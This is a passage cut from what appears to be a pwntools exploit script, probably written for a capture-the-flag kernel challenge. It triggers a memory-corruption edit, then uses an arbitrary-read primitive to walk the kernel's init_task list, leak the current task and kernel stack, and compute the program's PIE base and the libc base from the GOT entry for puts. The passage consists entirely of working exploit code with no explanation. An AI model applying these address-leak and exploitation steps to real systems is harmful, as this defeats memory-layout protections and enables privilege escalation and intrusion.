...
edit(-5, 1, b'\xf0')
init_task = kbase + 0xe12580
init_task_tasks_prev = init_task + 0x2f8
current_task = u64(aar(init_task_tasks_prev, 8)) - 0x2f0
log.info('current task: ' + hex(current_task))
kstack = u64(aar(current_task+0x20, 8))
log.info('kstack: ' + hex(kstack))
e.address = u64(aar(kstack+0x3f70, 8)) - e.symbols['_start']
log.info('PIE: ' + hex(e.address))
libc.address = u64(aar(e.got['puts'], 8)) - libc.symbols['puts']
